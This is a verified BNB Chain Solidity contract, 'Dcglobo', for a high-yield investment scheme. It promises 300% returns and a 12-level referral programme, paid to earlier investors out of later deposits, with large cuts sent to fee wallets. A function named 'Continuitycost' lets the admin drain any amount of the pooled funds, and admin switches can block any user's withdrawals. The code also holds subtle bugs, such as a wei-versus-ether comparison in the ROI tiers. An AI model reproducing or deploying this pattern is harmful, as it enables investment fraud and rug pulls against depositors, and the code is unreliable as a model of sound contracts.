/**
 *Submitted for verification at BscScan.com on 2022-07-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-06
*/

/*
 *  
 *   DCGLOBO
 *
 *   [INVESTMENT CONDITIONS]
 * 
 *   - ROI as per packages: [0.15, 0.4, 0.8, 1.5, 2.5, 7.5, 10] [0.5%/day]
 *									  [12, 15, 18] [0.75%/day]
 *									  [20, 30, 50, 100] [1%/day]
 * 
 *   - Total income: 300% (deposit included)
 *   - Earnings every moment, withdraw any time
 * 
 *   [AFFILIATE PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonuses.
 *   referral commission upto 12 level: 5% to 0.1%
 *   
 *.  ROI Level Income - 50% for 1st level minimum 1 direct, 10% from 2nd to 5th minimum 3 Direct, 3% from 6th to 12th minimum 5 direct.
 *
 *   ────────────────────────────────────────────────────────────────────────
 */

pragma solidity ^0.5.10;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface Dcglobov1
{
	
    function getUserDepositLength(address userAddress) external view returns(uint);
	function getUserDepositInfo(address userAddress, uint256 index) external view returns(uint256, uint256, uint256, bool,uint256);
	function getUseruplineInfo(address userAddress, uint index) external view returns(uint256, uint256);

}


contract Dcglobo {
	using SafeMath for uint256;

	Dcglobov1 public Dcglobov;

	uint256 constant public INVEST_MIN_AMOUNT = 0.15 ether;
	uint256 public MIN_WITHDRAW = 0.001 ether;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public TIME_STEP =  1 days;
	uint256 public maxWithDrawInADay = 1 ether;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint[12] public ref_bonuses = [500,200,100,50,50,25,25,25,25,10,10,10]; // 5%,2%,1%,0.5%,0.25%,0.1%;
	uint[12] public requiredDirect = [1,2,2,3,3,5,5,5,5,5,5,5];

	uint[12] public roi_level_bonuses = [5000,1000,1000,1000,1000,300,300,300,300,300,300,300]; // 50%,10%,3%;
	uint[12] public requiredDirect_roi = [1,3,3,3,3,5,5,5,5,5,5,5];
	address payable public takeone;
	address payable public taketwo;
	address payable public takethree;
	address payable public admin;

	uint256 public takeone_p;
	uint256 public taketwo_p;
	uint256 public takethree_p;

	


	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		bool end;
		uint256 roi;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256 bonus;
		uint256 match_bonus;
		uint256 totalWithdrawn;
		uint256 WithdrawnInADay;
		uint256 remainingWithdrawn;
		uint[12] refs;
		uint[12] refsBusiness;
		uint[12] refsBonus;
		bool activeForRoi;
		bool activeForWithdraw;
	}




	
	
	mapping (address => User) public users;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event MatchPayout(address indexed addr, address indexed from, uint256 amount);

	constructor(address payable _takeone, address payable _taketwo, address payable _takethree, address payable _admin, Dcglobov1 _address) public {
		takeone = _takeone;
		taketwo = _taketwo;
		takethree = _takethree;
		admin = _admin;

		takeone_p = 750;
		taketwo_p = 750;
		takethree_p = 2000;

		Dcglobov = _address;
	}

	function addfund() external payable{}


	function _RoiLevelPayout(address _addr, uint256 _amount) private {
		 address up = users[_addr].referrer;

        for(uint8 i = 0; i < roi_level_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].refs[0] >= requiredDirect_roi[i]){

					(uint256 to_payout, uint256 max_payout) = this.payoutOf(up);
					
					uint256 bonus = _amount * roi_level_bonuses[i] / PERCENTS_DIVIDER;
					uint remain = (max_payout - users[up].totalWithdrawn.add(to_payout));

					bonus = ( remain > 0 ) ? (remain > bonus) ? bonus : remain : 0;

                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
			}
            up = users[up].referrer;
        }
    }

	function invest(address referrer) public payable {


		
		require(!isContract(msg.sender) && msg.sender == tx.origin);
		require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 0.15');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].deposits.length > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");
		

		takeone.transfer(msg.value.mul(takeone_p).div(PERCENTS_DIVIDER));
		taketwo.transfer(msg.value.mul(taketwo_p).div(PERCENTS_DIVIDER));
		takethree.transfer(msg.value.mul(takethree_p).div(PERCENTS_DIVIDER));
		
		

		uint256 msgValue = msg.value;
		if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {

					users[upline].refsBusiness[i] = users[upline].refsBusiness[i].add(msgValue);
					if (user.deposits.length == 0) {
					users[upline].refs[i] =  users[upline].refs[i].add(1);
					}

					if(users[upline].refs[0] >= requiredDirect[i]){

						(uint256 to_payout, uint256 max_payout) = this.payoutOf(upline);
						
						uint amount = msgValue.mul(ref_bonuses[i]).div(PERCENTS_DIVIDER);
						uint remain = (max_payout - users[upline].totalWithdrawn.add(to_payout));

						amount = ( remain > 0 ) ? (remain > amount) ? amount : remain : 0;

							if (amount > 0) {

								users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
								users[upline].refsBonus[i] = users[upline].refsBonus[i].add(amount);
								emit RefBonus(upline, msg.sender, i, amount);

							}
					}
					
						
					upline = users[upline].referrer;
                } else break;

				
            }

			
			
        }

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			user.activeForRoi = true;
			user.activeForWithdraw = true;
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

		(uint256 _roi) = getRoiPercentage(msg.value);
		user.deposits.push(Deposit(msg.value, 0, block.timestamp,false, _roi));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		
		emit NewDeposit(msg.sender, msg.value);

	}

	function withdraw() public {

		User storage user = users[msg.sender];
		(uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);

		require(user.activeForWithdraw, "Withdrawal not active yet!");
        
		require(to_payout > 0, "User has no dividends");
		require(to_payout >= MIN_WITHDRAW, "Minimum withdrawal!");

		uint256 currentTime = block.timestamp;
		if(currentTime.sub(user.checkpoint) >= TIME_STEP){
			user.WithdrawnInADay = 0;
		}

		
		require(user.WithdrawnInADay < maxWithDrawInADay, "Maximum withdraw reached!");


		for (uint256 i = 0; i < user.deposits.length; i++) {
			
					if(user.totalWithdrawn.add(to_payout) >= max_payout){
						user.deposits[i].withdrawn = user.deposits[i].amount.mul(3);
					}
			
		}

		uint256 roi_ = getUserDividends(msg.sender);
        if(roi_ > 0){
		 _RoiLevelPayout(msg.sender,roi_);
		}


		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
		}

		uint256 referralMatchingBonus = getUserReferralMatchingBonus(msg.sender);
		if (referralMatchingBonus > 0) {
			user.match_bonus = 0;
		}

		if(user.WithdrawnInADay.add(to_payout) > maxWithDrawInADay){

			uint current_payout = to_payout;
			to_payout = maxWithDrawInADay.sub(user.WithdrawnInADay);
			user.remainingWithdrawn = current_payout.sub(to_payout);

		}else{

			user.remainingWithdrawn = 0;
		}


		user.checkpoint = block.timestamp;

		msg.sender.transfer(to_payout);

		user.WithdrawnInADay = user.WithdrawnInADay.add(to_payout);
		user.totalWithdrawn = user.totalWithdrawn.add(to_payout);
		totalWithdrawn = totalWithdrawn.add(to_payout);

		emit Withdrawn(msg.sender, to_payout);

	}



	function updateMaxWithdrawInADay(uint256 _amount) external {
		require(msg.sender == admin, 'permission denied!');
		maxWithDrawInADay =_amount;
    }

	function updateMinWithdraw(uint256 _amount) external {
		require(msg.sender == admin, 'permission denied!');
		MIN_WITHDRAW =_amount;
    }


	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw) {
        return (totalUsers, totalInvested, totalWithdrawn);
    }


	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate;

		uint256 totalDividends;
		uint256 dividends;


		if(user.activeForRoi){
			for (uint256 i = 0; i < user.deposits.length; i++) {
					userPercentRate = user.deposits[i].roi;
					if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(3)) {

						if (user.deposits[i].start > user.checkpoint) {

							dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
								.mul(block.timestamp.sub(user.deposits[i].start))
								.div(TIME_STEP);

						} else {

							dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
								.mul(block.timestamp.sub(user.checkpoint))
								.div(TIME_STEP);

						}

						if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(3)) {
							dividends = (user.deposits[i].amount.mul(3)).sub(user.deposits[i].withdrawn);
						}

						totalDividends = totalDividends.add(dividends);

					}
				
			}
		}

		return totalDividends;
	}

	function getUserDividendsByindex(address userAddress, uint i) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate;
		uint256 dividends;
		if(user.activeForRoi){
				userPercentRate = user.deposits[i].roi;
				if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(3)) {

					if (user.deposits[i].start > user.checkpoint) {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.deposits[i].start))
							.div(TIME_STEP);

					} else {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.checkpoint))
							.div(TIME_STEP);

					}

					if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(3)) {
						dividends = (user.deposits[i].amount.mul(3)).sub(user.deposits[i].withdrawn);
					}

				}
		}
		
		return dividends;
	}

	

	function getUseruplineInfo(address userAddress, uint index) public view returns(uint256, uint256) {
		return (users[userAddress].refs[index],users[userAddress].refsBusiness[index]);
	}

	
    function maxPayoutOf(address userAddress) view external returns(uint256) {
		User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}
        return amount * 3;
    }

	function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
		User storage user = users[_addr];
        max_payout = this.maxPayoutOf(_addr);


		if(user.totalWithdrawn < max_payout){
			payout = getUserDividends(_addr).add(getUserReferralBonus(_addr)).add(getUserReferralMatchingBonus(_addr)).add(user.remainingWithdrawn);

			if(user.totalWithdrawn.add(payout) > max_payout){
				payout = max_payout.sub(user.totalWithdrawn);
			}
		}

    }

	function getRoiPercentage(uint256 _amount) public pure returns(uint256){

		uint256 _roi;
		if(_amount >= 0.15 ether && _amount < 12 ether){
			_roi = 50;
		}else if(_amount >= 12 ether && _amount < 20 ether){
			_roi = 75;
		}else if(_amount >= 20){
			_roi = 100;
		}else{
			_roi = 50;
		}
		return _roi;
		
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralMatchingBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].match_bonus;
	}

	

	function isActive_for_roi(address userAddress, bool _boolen) external{

		require(msg.sender == admin, 'permission denied!');
		User storage user = users[userAddress];
		user.activeForRoi = _boolen;
	}

	function isActive_for_withdraw(address userAddress, bool _boolen) external{

		require(msg.sender == admin, 'permission denied!');
		User storage user = users[userAddress];
		user.activeForWithdraw = _boolen;
	}

	function update_take_p(uint256 _takeone_p, uint256 _taketwo_p, uint256 _takethree_p) external{

		require(msg.sender == admin, 'permission denied!');
		takeone_p = _takeone_p;
		taketwo_p = _taketwo_p;
		takethree_p = _takethree_p;
	}

	function Continuitycost(uint256 amount) external{
		if (msg.sender == admin) {
		    totalInvested = address(this).balance.sub(amount);
			msg.sender.transfer(amount);
		}
	}

	function getUserDepositLength(address userAddress) public view returns(uint){
		return users[userAddress].deposits.length;
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256, bool,uint256) {
	    User storage user = users[userAddress];
		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start, user.deposits[index].end, user.deposits[index].roi);
	}

	function getUserInfo(address userAddress) public view returns(
		uint256,
		address,
		uint256,
		uint256,
		uint256,
		uint256,
		uint256,
		bool,
		bool
		) {
	    User storage user = users[userAddress];

		
		return (user.checkpoint, user.referrer, user.bonus, user.match_bonus, user.totalWithdrawn, user.WithdrawnInADay, user.remainingWithdrawn, user.activeForRoi, user.activeForWithdraw);
	}


	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	

	function migrateContract(address _userAddress, uint256 _checkpoint,address _referrer,uint256 _bonus,uint256 _match_bonus,uint256 _totalWithdrawn,uint256 _WithdrawnInADay,uint256 _remainingWithdrawn,bool _activeForRoi,bool _activeForWithdraw) external{
		require(msg.sender == admin, 'permission denied!');

		User storage user = users[_userAddress];
		user.checkpoint = _checkpoint;
		user.referrer = _referrer;
		user.bonus = _bonus;
		user.match_bonus = _match_bonus;
		user.totalWithdrawn = _totalWithdrawn;
		user.WithdrawnInADay = _WithdrawnInADay;
		user.remainingWithdrawn =_remainingWithdrawn;
		user.activeForRoi = _activeForRoi;
		user.activeForWithdraw = _activeForWithdraw;

		migrateUserDeposite(_userAddress);
		migrateUserlevel(_userAddress);

		totalWithdrawn = totalWithdrawn.add(_totalWithdrawn);
		totalUsers = totalUsers.add(1);

		
	}

	function migrateUserDeposite(address _userAddress) internal{
		User storage user = users[_userAddress];
		uint256 count = uint256(Dcglobov.getUserDepositLength(_userAddress));
		for (uint i = 0; i < count; i++) {
		(uint256 _amount, uint256 _Withdrawal,uint256 _start,bool _end, uint256 _roi) = Dcglobov.getUserDepositInfo(_userAddress,0);
		user.deposits.push(Deposit(_amount, _Withdrawal, _start,_end, _roi));
		totalInvested = totalInvested.add(_amount);
		totalDeposits = totalDeposits.add(1);
		}
	}

	function migrateUserlevel(address _userAddress) internal{
		User storage user = users[_userAddress];
		for (uint i = 0; i < 12; i++) {
		(uint256 refs, uint256 refsBusiness) = Dcglobov.getUseruplineInfo(_userAddress,i);
		user.refs[i] = refs;
		user.refsBusiness[i] = refsBusiness;
		}
	}

	

	


	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	
}